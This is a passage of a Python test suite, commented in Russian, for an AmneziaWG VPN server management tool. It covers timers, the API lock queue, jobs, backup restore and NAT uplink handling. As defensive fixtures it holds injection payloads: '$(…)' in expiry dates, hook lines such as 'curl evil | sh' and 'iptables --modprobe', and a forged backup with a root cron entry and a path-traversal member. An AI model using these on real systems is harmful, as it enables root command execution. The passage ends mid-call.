rc, out, _ = bash(f'curl() {{ cat >/dev/null; flock -n "$STATE_DIR/api.lock" true && echo FREE >> "{SENT}" || echo HELD >> "{SENT}"; }}; '
                  'expire_check_run; clients_tsv | grep "^frank"')
sent = open(SENT).read().split() if os.path.exists(SENT) else []
# Telegram не отвечает: рассылка не дольше бюджета, остаток — в журнале
bash('py expire-clear "$SERVER_CONF" frank "$EXPIRE_SUSPEND_IP" >/dev/null; py meta-set "$SERVER_CONF" frank expires 1')
rc, out2, _ = bash(f'curl() {{ cat >/dev/null; echo X >> "{SENT}.2"; }}; EXPIRE_NOTIFY_BUDGET=0 expire_check_run; tail -1 "$EXPIRE_LOG"')
os.remove(os.path.join(ROOT, "bot.conf"))
chk("уведомления: бюджет времени исчерпан — дальше не шлём, в журнале сколько не ушло",
    not os.path.exists(SENT + ".2") and "не отправлено 1" in out2, out2)
chk("таймер: замок свободен — проход идёт; сообщения админам — уже без замка API",
    "\t127.0.0.2/32\t" in out and sent and set(sent) == {"FREE"}, [repr(out), sent])
api("client", "del", "frank")
rc, out, _ = bash("traffic_tick; cat $EXPIRE_LOG | tail -3")
# Блок за трафик делает скрипт таймера на диске, а не awg2: тот же сценарий через него
api("client", "limit", "alice", "1M", "total")
dump_with({"alice": (100 + 3 * 2**20, 100), "bob": (10, 10)})
# Окружение как у службы systemd: без HOME, USER, TERM, локали
reset_calls()
r = subprocess.run(["bash", SCR("EXPIRE_BIN")], capture_output=True, text=True, timeout=60, cwd="/",
                   env={k: v for k, v in ENV.items() if k in ("PATH", "CALLS", "LINKS", "ACTIVE", "IPT_SAVE", "AWG_DUMP")})
chk("скрипт таймера в окружении systemd — без ошибок", r.returncode == 0 and not r.stderr.strip()
    and "awg show awg0 transfer" in calls(), [r.returncode, r.stderr[-400:]])
chk("превысил лимит — блок скриптом таймера", cl("alice").get("blocked_by") == "traffic", cl("alice"))
with open(os.path.join(ROOT, "units", "awg2-expire.timer")) as f:
    unit = f.read()
chk("таймер сроков: каждые 15 с по часам, без Persistent и отсчёта от прошлого запуска",
    "OnCalendar=*-*-* *:*:00/15" in unit and "AccuracySec=1s" in unit and "Persistent" not in unit
    and "OnUnitActiveSec" not in unit, unit)
with open(os.path.join(ROOT, "units", "awg2-expire.service")) as f:
    chk("служба таймера: без «Starting/Finished» в журнале каждые 15 с", "LogLevelMax=notice" in f.read())
reset_calls()
bash('touch -d "-10 min" "$EXPIRE_STATE_DIR/transfer"; EXPIRE_STALE=300 expire_watchdog')
c = calls()
chk("сторож: таймер молчит 10 минут — ставит заново, перезапускает и сразу делает проход",
    "systemctl restart awg2-expire.timer" in c and "systemctl start --no-block awg2-expire.service" in c, c)
with open(os.path.join(ROOT, "expire.log")) as f:
    chk("сторож: запись в журнале сроков", "watchdog: таймер молчал" in f.read())
reset_calls()
bash('EXPIRE_STALE=300 expire_watchdog')
chk("сторож: таймер жив — не трогает", "awg2-expire" not in calls(), calls())
reset_calls()
bash('systemctl() { echo "systemctl $*" >> "$CALLS"; [[ "$1" == show ]] && echo "$ST"; return 0; }; '
     'ST=elapsed timer_heal awg2-expire.timer; ST=waiting timer_heal awg2-expire.timer; ST=running timer_heal awg2-expire.timer')
chk("заглохший таймер (elapsed) перезапускается, рабочий — не трогается",
    calls().count("systemctl restart awg2-expire.timer") == 1, calls())
# Перезагрузка модуля (module all / update / reload): rmmod не отдал модуль —
# туннели, остановленные перед ним, поднимаются обратно, а не лежат до ручного старта
RMBIN = os.path.join(TMP, "rmmodbin")
os.makedirs(RMBIN, exist_ok=True)
for name, body in (("rmmod", 'echo "rmmod $*" >> "$CALLS"; echo "rmmod: ERROR: Module amneziawg is in use" >&2; exit 1'),
                   ("systemctl", 'echo "systemctl $*" >> "$CALLS"\n'
                                 '[[ "$1" == list-units ]] && echo "awg-quick@awg0.service loaded active running x"\nexit 0')):
    with open(os.path.join(RMBIN, name), "w") as f:
        f.write("#!/usr/bin/env bash\n" + body + "\n")
    os.chmod(os.path.join(RMBIN, name), 0o755)
reset_calls()
rc, out, _ = bash(f'PATH="{RMBIN}:$PATH"; unset SSH_CONNECTION; AUTO_MODE=1; mod_reload 2>&1; echo "rc=$?"')
c = calls()
chk("перезагрузка модуля: rmmod не выгрузил — туннели снова запущены, ошибка сказана",
    "systemctl stop awg-quick@awg0.service" in c and "rmmod amneziawg" in c
    and c.rfind("systemctl start awg-quick@awg0.service") > c.find("rmmod amneziawg") >= 0
    and "rc=1" in out and "rmmod не выгрузил" in out, [c, out])
api("client", "limit", "alice", "off")
os.remove(AWG_DUMP)
# Предупреждение о длине I1-I5 — по каждому клиенту отдельно, не суммой по всем
for n in ("l1", "l2"):
    with open(os.path.join(ROOT, "root", f"{n}_awg2.conf"), "w") as f:
        f.write("[Interface]\nPrivateKey = X\nI1 = " + "<b 0x" + "aa" * 1000 + ">\n")
rc, out, _ = bash("mimicry_module_warnings 2>&1")
chk("длина I1-I5: два клиента по 2 КБ — без предупреждения", "длиннее" not in out, out)
with open(os.path.join(ROOT, "root", "l3_awg2.conf"), "w") as f:
    f.write("[Interface]\nPrivateKey = X\nI1 = " + "<b 0x" + "aa" * 1850 + ">\n")
rc, out, _ = bash("mimicry_module_warnings 2>&1")
chk("длина I1-I5: один клиент на 3.7 КБ — предупреждение", "длиннее" in out, out)
for n in ("l1", "l2", "l3"):
    os.remove(os.path.join(ROOT, "root", f"{n}_awg2.conf"))
# json-rows/json-list делят только по \n: U+2028 и \r внутри значения — не новая строка
rc, out, _ = bash("printf 'n\\tx\\tc1\\xe2\\x80\\xa8c2\\r\\n' | py json-rows name ip on")
chk("json-rows: U+2028 и \\r не режут строку", json.loads(out) == [{"name": "n", "ip": "x", "on": "c1\u2028c2"}], out)
rfd, wfd = os.pipe()          # пишущий конец держим открытым до конца вызова
try:
    out = subprocess.run([API_WRAP, "version"], stdin=rfd, capture_output=True, text=True,
                         env=ENV, timeout=60).stdout
except subprocess.TimeoutExpired:
    out = "завис на чтении stdin"
os.close(rfd)
os.close(wfd)
chk("открытый stdin не блокирует команду", '"ok": true' in out, out)
r = api("frobnicate")
chk("неизвестная команда — rc 2", r.get("ok") is False and r["rc"] == 2, r)
r = api("server", "proto", "9.9")
chk("проверка аргументов", r.get("ok") is False and r["rc"] == 2 and "server proto" in r["error"], r)

# Срок клиента приходит от бота и панели — в арифметику bash не должна попасть
# подстановка команды: «expire=+0+a[$(…)]d» раньше выполняла touch.
PWNED = os.path.join(TMP, "PWNED_TS")
r = api("client", "add", "victim", f"expire=+0+a[$(touch {PWNED})]d", "mimicry=none")
chk("срок: инъекция в арифметику отбита", r.get("ok") is False and not os.path.exists(PWNED)
    and "не распознан" in (r.get("error") or ""), r)
r = api("client", "add", "victim2", "expire=$(touch /tmp/x);echo 1", "mimicry=none")
chk("срок: команда в дате отбита", r.get("ok") is False and "не распознан" in (r.get("error") or ""), r)
rows = api("clients", "list").get("data") or []
chk("клиент с инъекцией в сроке не создан", not any(c["name"] in ("victim", "victim2") for c in rows), rows)
r = api("client", "add", "okdate", "expire=+30d", "mimicry=none")
chk("валидный срок +30d работает", r.get("ok"), r)
r = api("client", "add", "okabs", "expire=2027-01-01", "mimicry=none")
chk("валидная дата работает", r.get("ok"), r)

# Параметры вручную: проверка, запрет без force, применение, откат
ALICE = os.path.join(ROOT, "root", "alice_awg2.conf")
r = api("server", "params")
d = r.get("data") or {}
chk("api server params — текущие значения", r.get("ok") and d.get("proto") == "2.0" and d["values"]["Jc"] == "5"
    and d["values"]["H1"] == "100-2000" and list(d["values"])[:3] == ["Jc", "Jmin", "Jmax"]
    and d["errors"] == [] and d["changed"] == [] and "ContentPaddingAddition" not in d["values"], r)
r = api("server", "params", "check", "Jc=7", "S2=96", "HeaderProtectionKey=x")
d = r.get("data") or {}
chk("params check: ошибки, изменённые, обязательные для клиентов", r.get("ok") and d["values"]["Jc"] == "7"
    and any("S1 и S2" in e for e in d["errors"]) and any("перегенерацией" in e for e in d["errors"])
    and d["changed"] == ["Jc", "S2"] and d["breaking"] == ["S2"], d)
r = api("server", "params", "set", "S2=96")
chk("params set с ошибкой не пишет конфиг", not r.get("ok") and "S1 и S2" in r["error"]
    and kv(open(conf).read()).get("S2") == "60", r)
r = api("server", "params", "set", "Jc=20")
chk("предупреждение без force — отказ", not r.get("ok") and "force" in r["error"] and "рекомендуется 3-12" in r["log"]
    and kv(open(conf).read()).get("Jc") == "5", r)
reset_calls()
r = api("server", "params", "set", "force", "Jc=20", "Jmax=100")
d = r.get("data") or {}
chk("params set force: сервер, клиенты, рестарт", r.get("ok") and d.get("changed") == ["Jc", "Jmax"]
    and d.get("breaking") == [] and d.get("clients", 0) >= 2 and kv(open(conf).read()).get("Jc") == "20"
    and kv(open(ALICE).read()).get("Jmax") == "100" and kv(open(ALICE).read()).get("S1") == "40"
    and "awg-quick up" in calls() and "продолжают работать" in r.get("log", ""), [r, calls()])
BK = os.path.join(ROOT, "awg_backup")
chk("правка оставляет авто-бэкап", os.path.isdir(BK) and any(n.startswith("auto_params_") for n in os.listdir(BK)),
    os.listdir(BK) if os.path.isdir(BK) else "нет каталога")
r = api("server", "params", "set", "H1=10000-20000")
chk("смена H — клиентам нужны новые конфиги", r.get("ok") and r["data"]["breaking"] == ["H1"]
    and "обязаны совпадать" in r.get("log", "") and kv(open(ALICE).read()).get("H1") == "10000-20000", r)
r = api("server", "params", "set", "Jc=20")
chk("без изменений — без рестарта", r.get("ok") and "не изменились" in r.get("log", ""), r)
FAILBIN = os.path.join(TMP, "failbin")
os.makedirs(FAILBIN, exist_ok=True)
with open(os.path.join(FAILBIN, "awg-quick"), "w") as f:
    f.write('#!/usr/bin/env bash\n[[ "$1" == up ]] && { echo "Unable to modify interface: Invalid argument" >&2; exit 1; }\nexit 0\n')
os.chmod(os.path.join(FAILBIN, "awg-quick"), 0o755)
r = api("server", "params", "set", "S1=45", env={"PATH": FAILBIN + ":" + ENV["PATH"]})
chk("awg0 не поднялся — откат сервера и клиентов", not r.get("ok") and kv(open(conf).read()).get("S1") == "40"
    and kv(open(ALICE).read()).get("S1") == "40" and "возвращаю прежние" in r.get("log", ""), r)
rc, out, _ = bash('printf "S1 = 86\\nS2 = 48\\nS3 = 16\\nS4 = 12\\nH1 = 1\\nH2 = 2\\nH3 = 3\\nH4 = 4\\nJc = 4\\nJmin = 10\\nJmax = 50\\n'
                  'HeaderProtectionKey = K=\\nRekeyAfterTime = 115-150\\nRejectAfterTime = 180-210\\nRandomTrailers = on\\nDisableCookies = on\\n" '
                  '| py params-check 3.1 1280 S3=8 RejectAfterTime=140-200 DisableCookies=off')
chk("3.1: S ≥ 12, RejectAfterTime > RekeyAfterTime, off убирает ключ",
    "E\tS3 = 8" in out and "RejectAfterTime должен" in out and "K\tDisableCookies\toff" in out
    and "P\tDisableCookies" not in out and "P\tRandomTrailers = on" in out and "B\tS3" in out, out)

# Перезапуск бота по просьбе самого бота — отложенный: awg2 живёт в cgroup
# бота и обязан успеть ответить до того, как systemd его остановит
with open(ACTIVE, "a") as f:
    f.write("awg-bot.service\n")
reset_calls()
t0 = time.time()
r = api("bot", "restart")
quick_log = calls()
chk("api bot restart отвечает сразу, до перезапуска", r.get("ok") and time.time() - t0 < 2
    and "systemctl restart awg-bot.service" not in quick_log, [r.get("error"), quick_log[-200:]])
time.sleep(3)
chk("бот перезапускается через пару секунд", "systemctl restart awg-bot.service" in calls(), calls()[-300:])
open(ACTIVE, "w").close()

# Очередь: пока занят замок, изменяющая команда отказывает, чтение — нет
lock = os.path.join(ROOT, "var/lib/awg2/api.lock")
holder = subprocess.Popen(["flock", lock, "sleep", "8"])
time.sleep(0.5)
r = api("client", "del", "t-001", env={"API_LOCK_WAIT": "1"})
chk("занятая очередь — rc 75", r.get("ok") is False and r["rc"] == 75 and "другая операция" in r["error"], r)
r = api("clients", "list")
chk("чтение мимо очереди", r.get("ok") is True, r)
r = api("traffic", "now", env={"API_LOCK_WAIT": "1"})
chk("живая скорость (traffic now) — мимо очереди", r.get("ok") is True, r)
# Чтение — только точные команды по словам: хвост «info» или слово с пробелом
# внутри не делают запись чтением
r = api("antiscan", "allow", "add", "1.2.3.4", "info", env={"API_LOCK_WAIT": "1"})
r2 = api("antiscan", "allow add 1.2.3.4 info", env={"API_LOCK_WAIT": "1"})
r3 = api("client", "conf x", "info", env={"API_LOCK_WAIT": "1"})
chk("запись с хвостом «info» или словом с пробелом внутри — в очередь, а не мимо",
    r.get("rc") == 75 and r2.get("rc") == 75 and r3.get("rc") == 75, [r, r2, r3])
rr = {" ".join(a): api(*a, env={"API_LOCK_WAIT": "1"}).get("rc") for a in (
    ("antiscan", "status"), ("server", "info"), ("log", "antiscan", "5"), ("cert",), ("bot", "proxy", "get"))}
chk("чтения бота и панели — по-прежнему мимо очереди", all(v != 75 for v in rr.values()), rr)
holder.kill()
holder.wait()

# Фоновая задача: старт, опрос журнала по смещению, итог
r = api("job", "start", "diag", "dpi-hint")
jid = (r.get("data") or {}).get("id", "")
chk("api job start", r.get("ok") and re.match(r"^\d{8}-\d{6}-[0-9a-f]{4}$", jid), r)
st, log, off = {}, "", 0
for _ in range(60):
    st = api("job", "status", jid, str(off)).get("data") or {}
    log += st.get("log", "")
    off = st.get("offset", off)
    if st.get("state") != "running":
        break
    time.sleep(0.5)
chk("задача завершилась", st.get("state") == "done" and st.get("ok") is True and st.get("rc") == 0, st)
chk("журнал задачи без цвета", "dpi-detector" in log and "\x1b[" not in log, log[:200])
r = api("job", "list")
chk("api job list", r.get("ok") and r["data"] and r["data"][0]["id"] == jid and r["data"][0]["state"] == "done", r)
r = api("job", "start", "bogus")
jid = (r.get("data") or {}).get("id", "")
for _ in range(60):
    st = api("job", "status", jid).get("data") or {}
    if st.get("state") != "running":
        break
    time.sleep(0.5)
chk("ошибка задачи в итоге", st.get("state") == "done" and st.get("ok") is False and st.get("rc") == 2, st)

print("Бэкап")
r = api("backup", "create")
bk_path = (r.get("data") or {}).get("path") or ""
chk("бэкап — в каталоге песочницы, не в настоящем ~/awg_backup",
    r.get("ok") and bk_path.startswith(os.path.join(ROOT, "awg_backup")), r)
r = api("backup", "list")
chk("архив бэкапа в списке", bk_path in [b["path"] for b in r.get("data") or []], r)
# Автобэкап бота: только архив *_auto.tar.gz, из таких остаются последние N
BKD = os.path.join(ROOT, "awg_backup")
for d in ("20200101_000000", "20200102_000000", "20200103_000000"):
    open(os.path.join(BKD, f"awg2_backup_{d}_auto.tar.gz"), "w").close()
r = api("backup", "create", "auto", "2")
autos = sorted(f for f in os.listdir(BKD) if f.endswith("_auto.tar.gz"))
chk("автобэкап: архив без каталога, старые автобэкапы сверх N удалены, ручной не тронут",
    r.get("ok") and r["data"]["path"].endswith("_auto.tar.gz") and len(autos) == 2
    and autos[0] == "awg2_backup_20200103_000000_auto.tar.gz" and os.path.basename(r["data"]["path"]) == autos[1]
    and not os.path.isdir(r["data"]["path"][:-7]) and os.path.exists(bk_path), [r, autos])
rc, out, _ = bash('tar() { if [[ "$1" == -czf && "$2" == *_auto.tar.gz ]]; then echo partial > "$2"; return 1; fi; command tar "$@"; }; '
                  'backup_create archive auto 2 2>&1; echo "rc=$?"')
after = sorted(f for f in os.listdir(BKD) if "_auto" in f)
chk("автобэкап: архив не записался — ошибка, ни обрезка, ни каталога с ключами, целые не тронуты",
    "rc=1" in out and "Архив бэкапа не записан" in out and after == autos, [out[-300:], after])
for f in autos:
    os.remove(os.path.join(BKD, f))
r = api("backup", "inspect", bk_path)
chk("inspect: клиенты и метаданные", r.get("ok") and r["data"]["clients"] >= 2 and "timestamp=" in r["data"]["meta"], r)
junk = os.path.join(TMP, "junk.tar.gz")
with open(junk, "wb") as f:
    f.write(b"not a tar")
r = api("backup", "inspect", junk)
chk("не архив — понятная ошибка без трассировки Python",
    r.get("ok") is False and "это не архив" in r.get("log", "") and "Traceback" not in r.get("log", ""), r)
# Клиент, созданный после бэкапа, — сирота после восстановления: его конфиг убирается;
# конфиги клиентов, которые в awg0 бэкапа есть, остаются на месте
api("client", "add", "late", "mimicry=none")
LATE = os.path.join(ROOT, "root", "late_awg2.conf")
r = api("backup", "restore", bk_path)
chk("восстановление из архива", r.get("ok") and "Восстановлено" in r.get("log", ""), r)
chk("restore: конфиг клиента не из бэкапа убран, остальные на месте",
    not os.path.exists(LATE) and os.path.exists(ALICE)
    and not any(c["name"] == "late" for c in api("clients", "list").get("data") or []), os.listdir(os.path.join(ROOT, "root")))

# Сервера ещё нет: мастер в боте и панели спрашивает server info — поддержка 3.1
# проверяется честно (раньше был жёсткий «нет»), пробный интерфейс — один раз
awg_stub = os.path.join(BIN, "awg")
stub_body = open(awg_stub).read()
with open(awg_stub, "a") as f:
    f.write("# RandomTrailers\n")
NOSRV = 'echo v3.1.20260906 > "$MOD_TAG_FILE"; rm -f "$STATE_DIR/proto31"; SERVER_CONF="$STATE_DIR/none/awg0.conf"; '
reset_calls()
rc, out, _ = bash(NOSRV + "api_main server info; api_main server info >/dev/null")
d = json.loads(out.strip().splitlines()[0])
chk("без сервера: модуль и tools умеют 3.1 — мастер предложит AWG 3.1",
    d["data"]["exists"] is False and d["data"]["proto31"] is True and d["log"] == "", d)
chk("без сервера: пробный интерфейс — один раз, дальше ответ из памяти", calls().count("ip link add") == 1, calls())
rc, out, _ = bash(NOSRV.replace("v3.1.20260906", "v2.0.0").replace('rm -f "$STATE_DIR/proto31"; ', "") + "api_main server info")
chk("модуль сменился на 2.0 — ответ пересчитан: 3.1 нет", json.loads(out)["data"]["proto31"] is False, out)
chk("…и причина для мастера — модуль (кнопка «Модуль и tools»); при 3.1 причины нет",
    json.loads(out)["data"]["proto31_why"] == "module" and d["data"]["proto31_why"] == "", [out, d])
open(awg_stub, "w").write(stub_body)
rc, out, _ = bash(NOSRV + "api_main server info")
chk("tools без ключа 3.1 — причина tools (обновление одного модуля 3.1 не даст)",
    json.loads(out)["data"]["proto31"] is False and json.loads(out)["data"]["proto31_why"] == "tools", out)
rc, out, _ = bash("PATH=/nonexistent; proto_why 3.1")
chk("awg не установлен — причина components (мастер сначала ставит компоненты)", out.strip() == "components", out)
rc, out, _ = bash("mod_update_flow() { echo M; }; tools_update_flow() { echo T; }; components_update_flow; echo rc=$?; "
                  "mod_update_flow() { echo M; return 1; }; components_update_flow; echo rc=$?")
chk("module all: модуль, затем tools; модуль не собрался — tools не трогаются",
    out.split() == ["M", "T", "rc=0", "M", "rc=1"], out)
bash('rm -f "$STATE_DIR/proto31"')

# Бэкап с другого VPS: аплинк там назывался иначе (eth0 → ens3) — NAT в awg0.conf
# переводится на аплинк этого сервера, иначе клиенты остались бы без интернета
orig_conf = open(conf).read()
_, pl, _ = bash("_postup_lines 10.23.45.0/24 eth0")
eth0_conf = orig_conf.replace("PostUp = true\nPostDown = true\n", pl)
open(conf, "w").write(eth0_conf)
rc, out, _ = bash("conf_uplink")
chk("NAT в awg0.conf — на аплинк, где создан сервер", eth0_conf != orig_conf and out.strip() == "eth0", out)
rc, out, _ = bash('uplink_iface() { echo ens3; }; conf_uplink_sync >/dev/null; echo "rc=$?"; conf_uplink_sync; echo "rc2=$?"')
post = [ln for ln in open(conf).read().splitlines() if ln.startswith(("PostUp", "PostDown"))]
chk("аплинк сменился — PostUp и PostDown на новом, FORWARD awg0 не тронут, повтор ничего не меняет",
    "rc=0" in out and "rc2=1" in out and len(post) == 2
    and all("-o ens3 -j MASQUERADE" in ln and "-o eth0" not in ln for ln in post) and "-o awg0 -j ACCEPT" in post[0],
    [out, post])
BK_ETH0 = os.path.join(TMP, "bk_eth0")
os.makedirs(BK_ETH0)
with open(os.path.join(BK_ETH0, "awg0.conf"), "w") as f:
    f.write(eth0_conf)
rc, out, _ = bash("AUTO_MODE=1; uplink_iface() { echo ens3; }; " + f"backup_restore '{BK_ETH0}' 2>&1")
now_conf = open(conf).read()
chk("восстановление бэкапа с eth0 на сервер с ens3 — NAT сразу на ens3",
    rc == 0 and "eth0 → ens3" in out and "-o ens3 -j MASQUERADE" in now_conf and "-o eth0 -j MASQUERADE" not in now_conf, out[-600:])
rc, out, _ = bash("AUTO_MODE=1; do_repair 2>&1")
now_conf = open(conf).read()
chk("«Проверить и починить» возвращает NAT на настоящий аплинк навсегда — в awg0.conf",
    "на ens3, такого интерфейса нет; выход сервера — eth0" in out and "NAT перенесён на eth0" in out
    and "-o eth0 -j MASQUERADE" in now_conf and "-o ens3" not in now_conf, out[-800:])
# Интерфейс из awg0.conf на этом сервере есть — NAT через него выбран
# сознательно: не переписывается и не перебивается правилом на аплинк
open(conf, "w").write(eth0_conf.replace("-o eth0 ", "-o tun9 "))
links_saved = open(LINKS).read()
with open(LINKS, "a") as f:
    f.write("tun9\n")
open(CALLS, "w").close()
rc, out, _ = bash('conf_uplink_sync; echo "rc=$?"; AUTO_MODE=1; do_repair 2>&1')
now_conf = open(conf).read()
chk("NAT на существующем интерфейсе — оставлен, проверяется на нём же",
    "rc=1" in out and "оставляю как настроено" in out and "-o tun9 -j MASQUERADE" in now_conf
    and "-o eth0 -j MASQUERADE" not in open(CALLS).read(), [out[-800:], open(CALLS).read()[-600:]])
open(LINKS, "w").write(links_saved)
BK_TUN9 = os.path.join(TMP, "bk_tun9")
os.makedirs(BK_TUN9, exist_ok=True)
with open(os.path.join(BK_TUN9, "awg0.conf"), "w") as f:
    f.write(eth0_conf.replace("-o eth0 ", "-o tun9 "))
with open(LINKS, "a") as f:
    f.write("tun9\n")
rc, out, _ = bash(f"AUTO_MODE=1; uplink_iface() {{ echo eth0; }}; backup_restore '{BK_TUN9}' 2>&1")
chk("восстановление бэкапа: NAT на аплинк этого сервера, даже если интерфейс со старым именем здесь есть",
    "tun9 → eth0" in out and "-o eth0 -j MASQUERADE" in open(conf).read(), out[-500:])
open(LINKS, "w").write(links_saved)
# awg0 поднят: опускается до правки (PostDown старого конфига снимает старое
# правило NAT) и поднимается снова
open(conf, "w").write(eth0_conf)
with open(LINKS, "a") as f:
    f.write("awg0\n")
open(CALLS, "w").close()
rc, out, _ = bash('uplink_iface() { echo ens3; }; conf_uplink_sync >/dev/null; echo "rc=$?"')
cl_ = [ln for ln in open(CALLS).read().splitlines() if ln.startswith("awg-quick")]
chk("смена аплинка на поднятом awg0: down до правки, потом up",
    "rc=0" in out and len(cl_) == 2 and cl_[0].startswith("awg-quick down") and cl_[1].startswith("awg-quick up")
    and "-o ens3 -j MASQUERADE" in open(conf).read(), [out, cl_])
open(LINKS, "w").write(links_saved)
open(conf, "w").write(orig_conf)

# Хуки awg-quick выполняются от root. Свои команды Тулзы (1.x и 0.8) проходят,
# чужие и iptables --modprobe (запускает любую программу) — нет.
HOOKS = os.path.join(TMP, "hooks.conf")
rc, out, _ = bash(f'{{ echo "[Interface]"; _postup_lines 10.8.0.0/24 eth0; '
                  'echo "PostUp = ip link set dev awg0 mtu 1320; echo 1 > /proc/sys/net/ipv4/ip_forward; '
                  'iptables -t nat -C POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE >/dev/null 2>&1 || '
                  'iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE"; '
                  f'}} > "{HOOKS}"; py conf-hooks "{HOOKS}" check')
chk("хуки Тулзы (1.x и 0.8) — допустимы", rc == 0 and out == "", out)
with open(HOOKS, "w") as f:
    f.write("[Interface]\nPostUp = iptables -A INPUT -p tcp --dport 2222 -j ACCEPT; touch /tmp/x; "
            "iptables -C X 2>/dev/null || curl evil | sh\nPreUp = iptables --modp=/tmp/x -L\n"
            "PreDown = ip6tables -M /tmp/x -L\nPostDown = iptables -L $(id)\nSaveConfig = true\n"
            "\n[Peer]\nPublicKey = P\n")
rc, out, _ = bash(f'py conf-hooks "{HOOKS}" fix')
bad = out.splitlines()
chk("недопустимые команды названы: чужие, --modprobe, подстановка, SaveConfig",
    rc == 0 and "PostUp\ttouch /tmp/x" in bad and "PostUp\tiptables -C X 2>/dev/null || curl evil | sh" in bad
    and "PreUp\tiptables --modp=/tmp/x -L" in bad and "PreDown\tip6tables -M /tmp/x -L" in bad
    and "PostDown\tiptables -L $(id)" in bad and "SaveConfig\tSaveConfig = true" in bad and len(bad) == 6, out)
with open(HOOKS) as f:
    fixed = f.read()
chk("в файле — только допустимое, [Peer] не тронут",
    fixed == "[Interface]\nPostUp = iptables -A INPUT -p tcp --dport 2222 -j ACCEPT\n\n[Peer]\nPublicKey = P\n", fixed)
WGC = os.path.join(ROOT, "etc/wireguard/wgobf0.conf")
os.makedirs(os.path.dirname(WGC), exist_ok=True)
with open(WGC, "w") as f:
    f.write("[Interface]\nPrivateKey = X\nPostUp = touch /tmp/x\npostdown = /old/fw.sh down\nListenPort = 1\n")
rc, out, _ = bash('_wgobf_hooks_reset 2>&1; echo "==="; cat "$WGOBF_WG_CONF"; echo "FW=$WGOBF_FW"')
said, rest = out.split("===", 1)
conf_text, fw = rest.rsplit("FW=", 1)
fw = fw.strip()
chk("wgobf0 из бэкапа: хуки — ровно скрипт Тулзы, о чужих — предупреждение",
    conf_text.strip() == f"[Interface]\nPostUp = {fw} up\nPostDown = {fw} down\nPrivateKey = X\nListenPort = 1"
    and "чужие команды" in said and "touch /tmp/x" in said and "/old/fw.sh down" in said, out)
with open(WGC, "w") as f:
    f.write(" [interface]\r\nPrivateKey = X\r\nPostUp = touch /tmp/x\r\nListenPort = 1\r\n")
rc, out, _ = bash('_wgobf_hooks_reset >/dev/null 2>&1; echo "rc=$?"; cat "$WGOBF_WG_CONF"')
chk("wgobf0 из бэкапа: « [interface]» и CRLF — заголовок приведён, хуки Тулзы на месте",
    out.startswith("rc=0\n") and f"[Interface]\nPostUp = {fw} up\nPostDown = {fw} down\nPrivateKey = X\nListenPort = 1" in out
    and b"\r" not in open(WGC, "rb").read(), repr(out))   # вывод bash() — text=True, \r\n там уже \n
with open(WGC, "w") as f:
    f.write("PrivateKey = X\n")
rc, out, _ = bash('_wgobf_hooks_reset >/dev/null 2>&1; echo "rc=$?"')
chk("wgobf0 из бэкапа без секции [Interface] — ошибка, а не обфускатор без файрвола", out.strip() == "rc=1", out)

# Подделанный бэкап: в awg0.conf — команды не из Тулзы, в архиве туннелей —
# файл вне путей Тулзы, exit-нода с хуком, мусор в каскаде и tun2socks,
# чужой toml dnscrypt-proxy; в каталоге WARP — «скрипт автозапуска».
# Прежде tunnels.tar.gz распаковывался прямо в / как есть.
import io
import shutil
import tarfile
EVIL = os.path.join(TMP, "evil")
shutil.rmtree(EVIL, ignore_errors=True)
with tarfile.open(bk_path) as t:
    t.extractall(EVIL)
top = os.path.join(EVIL, os.listdir(EVIL)[0])
with open(os.path.join(top, "awg0.conf")) as f:
    srv = f.read()
srv = srv.replace("[Interface]\n", "[Interface]\nPostUp = iptables -A INPUT -p tcp --dport 2222 -j ACCEPT; "
                  f"touch {TMP}/pwned\nSaveConfig = true\n", 1)
with open(os.path.join(top, "awg0.conf"), "w") as f:
    f.write(srv)
os.makedirs(os.path.join(top, "warp/wgcf"), exist_ok=True)
for name, body in (("warp-autostart.sh", f"#!/bin/sh\ntouch {TMP}/pwned\n"), ("wgcf-account.toml", "acct\n")):
    with open(os.path.join(top, "warp/wgcf", name), "w") as f:
        f.write(body)
AWGD = os.path.join(ROOT, "etc/amnezia/amneziawg")
members = {
    os.path.join(ROOT, "etc/cron.d/evil"): "* * * * * root touch /tmp/pwned\n",
    os.path.join(AWGD, "awg-exit-n2.conf"): "[Interface]\nPrivateKey = X\nAddress = 10.9.0.2/32\n"
                                            f"PostUp = touch {TMP}/pwned\n\n[Peer]\nPublicKey = P\n"
                                            "Endpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0\n",
    os.path.join(AWGD, "awg-exit-../x.conf"): "[Interface]\n",
    os.path.join(ROOT, "etc/awg-cascade/rules.conf"): "udp|4443|5.6.7.8|443|ok\nudp|1;id|5.6.7.8|443|bad\n"
        "tcp|8080|10.0.0.5|80|private\nudp|4444|010.0.0.1|443|zeros\ntcp|99999|5.6.7.8|443|port\n"
        "udp|51820|5.6.7.8|443|awgport\nudp|4443|5.6.7.9|443|dup\n",
    os.path.join(ROOT, "etc/xray/config.json"): json.dumps({
        "log": {"access": "/etc/cron.d/x"}, "api": {"tag": "api", "services": ["HandlerService"]},
        "inbounds": [{"tag": "socks-in", "protocol": "socks", "listen": "0.0.0.0", "port": 10808},
                     {"tag": "open", "protocol": "socks", "listen": "0.0.0.0", "port": 1080},
                     {"tag": "api-in", "protocol": "dokodemo-door", "listen": "0.0.0.0", "port": 10085}],
        "outbounds": [{"tag": "proxy_a", "protocol": "vless", "settings": {}}, {"tag": "direct", "protocol": "freedom"}],
        "routing": {"rules": [{"inboundTag": ["api-in"], "outboundTag": "api"},
                              {"inboundTag": ["socks-in"], "outboundTag": "proxy_a"}]}}),
    os.path.join(ROOT, "etc/tun2socks/proxy.txt"): "127.0.0.1:1080;touch x\n",
    os.path.join(ROOT, "etc/dnscrypt-proxy/dnscrypt-proxy.toml"):
        "server_names = ['quad9-doh-ip4-port443-nofilter-pri']\n[query_log]\n  file = '/etc/cron.d/x'\n",
}
with tarfile.open(os.path.join(top, "tunnels.tar.gz"), "w:gz") as t:
    for path, body in members.items():
        data = body.encode()
        ti = tarfile.TarInfo(path.lstrip("/"))
        ti.size = len(data)
        t.addfile(ti, io.BytesIO(data))
EVIL_TGZ = os.path.join(TMP, "evil_backup.tar.gz")
with tarfile.open(EVIL_TGZ, "w:gz") as t:
    t.add(top, arcname=os.path.basename(top))
r = api("backup", "restore", EVIL_TGZ, "tunnels")
log = r.get("log", "")
with open(os.path.join(AWGD, "awg0.conf")) as f:
    srv = f.read()
chk("restore чужого бэкапа: из awg0.conf убраны команды не из Тулзы, о них — в итоге",
